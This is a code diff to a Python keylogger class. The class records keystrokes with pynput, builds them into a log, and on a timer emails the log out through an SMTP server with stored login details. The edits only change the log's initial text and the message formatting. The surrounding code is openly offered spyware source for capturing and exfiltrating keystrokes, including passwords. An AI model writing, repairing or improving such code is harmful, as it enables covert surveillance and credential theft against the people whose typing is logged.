@@ -3,9 +3,9 @@ import pynput.keyboard
 import subprocess, smtplib
 
 class Keylogger:
-    
+
     def __init__(self, interval):
-        self.log = ""
+        self.log = "Keylogger Started"
         self.interval = interval
 
         self.smtp_server = ''
@@ -33,7 +33,7 @@ class Keylogger:
         else:
             print(self.log)
         
-        self.log = ''
+        self.log = 'Keylogger Started'
         timer = threading.Timer(self.interval, self.report)
         timer.start()
 
@@ -49,7 +49,7 @@ class Keylogger:
         server = smtplib.SMTP(self.smtp_server, self.smtp_port)
         server.starttls()
         server.login(self.email, self.password)
-        server.sendmail(self.email,self.email,mesage)
+        server.sendmail(self.email,self.email, "\n\n" + str(mesage))
         server.quit()
 
     def start(self):
